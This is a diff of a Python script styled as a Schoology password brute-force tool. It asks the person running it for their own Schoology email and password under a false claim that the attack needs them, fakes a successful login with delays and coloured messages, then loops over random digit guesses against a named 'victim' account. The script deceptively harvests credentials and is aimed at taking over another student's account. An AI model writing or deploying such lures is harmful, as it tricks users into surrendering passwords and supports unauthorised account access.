@@ -19,14 +19,16 @@ print('''
 ''')
 e = input("[?] Your schoology email?: ")
 d = input("[?] Your schoology password? (bruteforce attack wont work without it): ")
-print("attempting to login with...\033[1;3m " + e + ", " + d)
-time.sleep(3)
-print("successfully logged in as " + e + "[\u2713]")
+print("attempting to log into schoology with...\033[1;3m " + e)
+time.sleep(4)
+print("\033[32msuccessfully logged in as " + e + " [\u2713]")
 
 c = input("[?] Victims schoology email?: ")
 b = int(input("[?] How many passwords would you like to try?: "))
 a = input("[?] Start Attack? [y/n]: ")
 if a == 'y':
+    print("\033[31mStarting bruteforce on " + c + " passwords:\033[37m " + d)
+    time.sleep(2)
     for i in range(b):
         randomnumber = chr(random.randint(ord('0'), ord('9')))
         randomnumber2 = chr(random.randint(ord('0'), ord('9')))
